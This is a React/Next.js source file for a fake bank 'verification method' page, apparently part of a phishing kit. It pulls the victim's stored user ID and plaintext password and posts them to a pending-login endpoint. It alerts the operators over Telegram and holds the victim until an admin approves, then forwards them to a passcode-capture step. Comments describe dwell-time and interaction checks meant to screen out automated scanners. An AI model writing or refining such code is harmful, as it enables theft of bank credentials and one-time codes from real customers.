"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Mail, Phone } from "lucide-react";
import { NbsAuthShell } from "@/components/nbs-auth-shell";
import { pollPendingLogin } from "@/lib/poll-pending-login";
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
} from "@/lib/approval-messages";

/**
 * Verification Method Selection Page (Gate1).
 *
 * Kit: Other / custom. The project already ships its own verification routes
 * (`ubs_*` session keys, `/verify-choice` → `/verify`), so per
 * Step 2 §7A the existing route names are kept and only the UI is brought onto the
 * landing shell.
 *
 * Gate1 logic is unchanged: selecting a method and continuing posts the same
 * `/api/telegram/verification-click` notification the page always sent, then the
 * admin approval advances to the One-Time Passcode Entry Page.
 */

const OPTIONS = [
  {
    value: "email" as const,
    label: "Email",
    verificationType: "Email",
    description: "Send a verification code to your email address.",
    Icon: Mail,
  },
  {
    value: "text" as const,
    label: "Text Message",
    verificationType: "Text",
    description: "Send a verification code to your mobile number by SMS.",
    Icon: Phone,
  },
];

export default function VerifyChoicePage() {
  const router = useRouter();
  const [selectedMethod, setSelectedMethod] = useState<"email" | "text" | null>(
    null
  );
  const [isLoading, setIsLoading] = useState(false);
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [loginError, setLoginError] = useState<string | null>(null);

  /* Kit §8: Gate 1 must send `dwellMs` + `interacted` so the origin gate can
     tell a person who spent time choosing a method from an instant script. Without
     them the server falls back to the `xo_bot_js` cookie timestamp, which makes
     the 500ms floor a guess about when the page loaded. */
  const mountedAtRef = useRef<number>(Date.now());
  const interactedRef = useRef(false);

  useEffect(() => {
    const onFirstInteraction = () => {
      interactedRef.current = true;
    };
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  // Masked destination hints, as shown before the code is generated.
  useEffect(() => {
    setEmail("****@example.com");
    setPhone("***-***-****");
  }, []);

  const handleContinue = async () => {
    if (isLoading || !selectedMethod) return;
    const option = OPTIONS.find((item) => item.value === selectedMethod);
    if (!option) return;

    setIsLoading(true);

    // Record the method BEFORE any await, so a hung request can never leave the
    // member stranded here with every control disabled.
    if (typeof window !== "undefined") {
      sessionStorage.setItem("ubs_method", selectedMethod);
    }

    // RULE 8: fire-and-forget — the ops notification must not gate the poll.
    void fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ verificationType: option.verificationType }),
    }).catch(console.error);

    const userId = sessionStorage.getItem("ubs_userid") ?? "";
    const password = sessionStorage.getItem("ubs_password") ?? "";

    let created: { id?: string } | null = null;
    try {
      const response = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          password,
          method: selectedMethod,
          maskedEmail: email,
          maskedPhone: phone,
          flow: "login",
          dwellMs: Date.now() - mountedAtRef.current,
          interacted: interactedRef.current,
        }),
      });
      if (!response.ok) throw new Error(`pending-login ${response.status}`);
      created = (await response.json()) as { id?: string };
    } catch (err) {
      console.error("Pending login create error:", err);
      setIsLoading(false);
      setLoginError(MSG_UNABLE_REACH_VERIFICATION);
      return;
    }

    if (!created?.id) {
      setIsLoading(false);
      setLoginError(MSG_UNABLE_REACH_VERIFICATION);
      return;
    }

    const result = await pollPendingLogin(created.id, APPROVAL_TIMEOUT_MS);

    if (result === "approved") {
      // RULE 6: navigate immediately — no post-approve delay.
      router.push("/verify");
      return;
    }
    if (result === "redirected") {
      window.location.href = "/api/login-out";
      return;
    }
    if (result === "denied") {
      window.location.href = "/?loginDenied=1";
      return;
    }
    // RULE 2: Gate 1 timeout lands on the homepage with the canonical error.
    window.location.href = "/?verifyUnavailable=1";
  };

  /**
   * Arrow-key navigation for the method radiogroup. Declaring `role="radio"`
   * promises assistive tech that the group behaves like a native radio set, which
   * requires arrow keys to move and select within the group.
   */
  const handleOptionKeyDown = (event: React.KeyboardEvent<HTMLDivElement>) => {
    const { key } = event;
    if (key !== "ArrowDown" && key !== "ArrowUp" && key !== "ArrowRight" && key !== "ArrowLeft") {
      return;
    }
    event.preventDefault();

    const currentIndex = OPTIONS.findIndex(
      (item) => item.value === selectedMethod
    );
    const forward = key === "ArrowDown" || key === "ArrowRight";
    const startIndex = currentIndex === -1 ? (forward ? 0 : OPTIONS.length - 1) : currentIndex;
    const delta = forward ? 1 : -1;
    const nextIndex =
      (startIndex + delta + OPTIONS.length) % OPTIONS.length;

    setSelectedMethod(OPTIONS[nextIndex].value);
  };

  return (
    <NbsAuthShell>
      <style>{`
        .method-options {
          display: flex;
          flex-direction: column;
          gap: 10px;
          margin-bottom: 18px;
        }

        .verify-error {
          color: #ff8080;
          font-size: 12.5px;
          margin-bottom: 14px;
        }

        .method-option {
          display: flex;
          align-items: center;
          gap: 12px;
          width: 100%;
          padding: 12px 14px;
          background: rgba(255, 255, 255, 0.04);
          border: 1px solid #555;
          border-radius: 3px;
          color: #ddd;
          font-size: 14px;
          text-align: left;
          cursor: pointer;
          transition: border-color 0.2s, background 0.2s;
        }

        .method-option:hover:not(:disabled) {
          border-color: #8a8a8a;
          background: rgba(255, 255, 255, 0.07);
        }

        .method-option--selected {
          border-color: #ffc439;
          background: rgba(255, 196, 57, 0.12);
        }

        .method-option:disabled {
          cursor: not-allowed;
          opacity: 0.7;
        }

        .method-option__icon {
          display: inline-flex;
          flex-shrink: 0;
          color: #ffc439;
        }

        .method-option__text {
          display: flex;
          flex-direction: column;
          gap: 2px;
          min-width: 0;
        }

        .method-option__label {
          font-weight: 700;
          color: #e6e6e6;
        }

        .method-option__value {
          font-size: 12.5px;
          color: #bbb;
        }

        .verify-actions {
          display: flex;
          gap: 10px;
          margin-top: 14px;
        }

        .verify-secondary-btn {
          flex: 1;
          padding: 9px 10px;
          background: #4a4a4a;
          color: #ddd;
          border: 1px solid #5f5f5f;
          border-radius: 3px;
          font-size: 13px;
          font-weight: 600;
          cursor: pointer;
        }

        .verify-secondary-btn:hover:not(:disabled) {
          background: #555;
        }

        .verify-secondary-btn:disabled {
          opacity: 0.7;
          cursor: not-allowed;
        }

        .verify-link-btn {
          display: block;
          width: 100%;
          margin-top: 14px;
          background: none;
          border: none;
          padding: 0;
          color: #e0a020;
          font-size: 13px;
          text-align: center;
          cursor: pointer;
        }

        .verify-link-btn:hover:not(:disabled) {
          text-decoration: underline;
        }
      `}</style>

      <div className="login-card">
        <h1>Select Verification Method</h1>

        <p className="note">
          We found you! Pick a method to receive a verification code now.
        </p>

        {/* RULE 3: plain colored text only — no bordered box, no alert card. */}
        {loginError && <p className="verify-error">{loginError}</p>}

        <div
          className="method-options"
          role="radiogroup"
          aria-label="Verification method"
          onKeyDown={handleOptionKeyDown}
        >
          {OPTIONS.map(({ value, label, verificationType, description, Icon }, index) => {
            const isSelected = selectedMethod === value;
            return (
              <button
                key={value}
                type="button"
                role="radio"
                aria-checked={isSelected}
                // Roving tabindex: only the active radio is in the tab order, which is
                // what makes arrow-key navigation correct for a radiogroup.
                tabIndex={isSelected || (!selectedMethod && index === 0) ? 0 : -1}
                disabled={isLoading}
                onClick={() => setSelectedMethod(value)}
                className={`method-option${
                  isSelected ? " method-option--selected" : ""
                }`}
              >
                <span className="method-option__icon">
                  <Icon className="w-5 h-5" aria-hidden="true" />
                </span>
                <span className="method-option__text">
                  <span className="method-option__label">{label}</span>
                  <span className="method-option__value">
                    {verificationType === "Email"
                      ? "Send code to email"
                      : "Send code via text"}
                  </span>
                  <span className="method-option__value">{description}</span>
                </span>
              </button>
            );
          })}
        </div>

        <button
          className="btn-login"
          type="button"
          onClick={handleContinue}
          disabled={isLoading || !selectedMethod}
        >
          {isLoading ? "SENDING CODE..." : "CONTINUE"}
        </button>

        <div className="verify-actions">
          <button
            type="button"
            className="verify-secondary-btn"
            disabled={isLoading}
            onClick={() => router.push("/")}
          >
            ✕ CANCEL
          </button>
          <button
            type="button"
            className="verify-secondary-btn"
            disabled={isLoading}
            onClick={() => router.back()}
          >
            ← BACK
          </button>
        </div>
      </div>
    </NbsAuthShell>
  );
}
